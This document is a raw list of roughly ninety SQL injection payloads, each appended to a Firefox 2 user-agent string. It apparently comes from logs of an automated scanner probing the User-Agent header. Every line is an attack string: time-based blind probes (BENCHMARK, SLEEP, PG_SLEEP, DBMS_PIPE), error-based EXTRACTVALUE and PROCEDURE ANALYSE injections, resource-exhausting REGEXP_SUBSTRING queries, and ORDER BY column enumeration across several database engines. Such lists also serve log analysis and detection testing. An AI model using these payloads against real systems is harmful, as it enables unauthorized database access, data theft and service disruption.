Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- fGWr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- oWCg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (2147=2147
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ((6819=6819
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (((2542=2542
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (('JmWm'='JmWm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ((('PdvF'='PdvF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND 'yuoA'='yuoA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND 'nzZS' LIKE 'nzZS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (\x22GdkE\x22=\x22GdkE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (((\x22gVHJ\x22=\x22gVHJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ((\x22zjss\x22 LIKE \x22zjss
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS ztqM WHERE 1597=1597 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- pdpU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS MOmi WHERE 7135=7135 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- GQJh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS kUsy WHERE 2799=2799 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- ZYMt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 4739=4739 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- lMkm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS JekY WHERE 3511=3511 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS TRmY WHERE 5533=5533 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- tLOH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- lFiB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- UdjL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- UGFi
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ((2132=2132
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (((7978=7978
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ('vOBo' LIKE 'vOBo
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND 'fKJv' LIKE 'fKJv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (\x22vhLL\x22=\x22vhLL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND \x22XQIq\x22=\x22XQIq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (\x22YjpD\x22 LIKE \x22YjpD
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND \x22ydyS\x22 LIKE \x22ydyS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 2823=2823 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- VhaV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 3395=3395 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- OHZQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(84)||CHAR(71)||CHAR(119)||CHAR(115) WHERE 2138=2138 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS IetO WHERE 2504=2504 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- quOj
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS FEoG WHERE 6873=6873 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- ZljU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS vYsB WHERE 4673=4673 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- ysIt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 3973=3973 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- enay
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 4505=4505 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- ZGdj
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE)(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- EStc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (6448=6448
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (((\x22xLqy\x22=\x22xLqy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (\x22uRhs\x22 LIKE \x22uRhs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (((\x22bpdF\x22 LIKE \x22bpdF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))# jMgK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 8543=8543 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- sAXH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 2045=2045 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- bezi
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(109)||CHAR(75)||CHAR(67)||CHAR(76) FROM DUAL WHERE 1218=1218 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(86)||CHAR(75)||CHAR(89)||CHAR(109) WHERE 3616=3616 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHAR(83)||CHAR(68)||CHAR(81)||CHAR(86) WHERE 9298=9298 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS dpho WHERE 1144=1144 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- ysHY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS UdOn WHERE 2953=2953 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- BcmA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS Ufvn WHERE 8216=8216 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- kRuN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 7628=7628 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- ZGaR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 4454=4454 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- ukMQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (7821=7821) THEN SLEEP(32) ELSE 7821 END))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (4469=4469) THEN (SELECT 4469 FROM PG_SLEEP(32)) ELSE 1/(SELECT 0) END))-- vgzI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (8377=8377) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 8377*(SELECT 8377 UNION ALL SELECT 6816) END))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (8072=8072) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(73)||CHR(90)||CHR(78),32) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)-- mpyT
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (3508=3508) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL))) ELSE 3508/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))-- Kyfa
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 2814-- Yorp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 9786-- JCZn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) ORDER BY 1-- ZBFi
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) ORDER BY 3575-- jQZR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 5940-- PhGq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 1-- UkFm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 1-- tdEK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' ORDER BY 2980-- HMeI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 1-- yNKL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 2007-- qFnm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 7760-- ktPm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 4720-- kqQt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 1-- VqeF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS HNUN WHERE 2821=2821 ORDER BY 2418-- uMti
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS FgtX WHERE 7648=7648 ORDER BY 1-- ISgV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS yOyM WHERE 3523=3523 ORDER BY 1-- zoSR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) ORDER BY 3367-- qwNR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 1076#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 8965#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 2436#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) ORDER BY 3042#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 5784#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 7312#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 3726#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 8712#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 2824#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS ZzcP WHERE 3949=3949 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS PoMl WHERE 1627=1627 ORDER BY 3391#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS gCVm WHERE 2603=2603 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS NDpN WHERE 4092=4092 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS ZzOT WHERE 5380=5380 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 5624=5624 ORDER BY 4664#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 5578=5578 ORDER BY 6572#
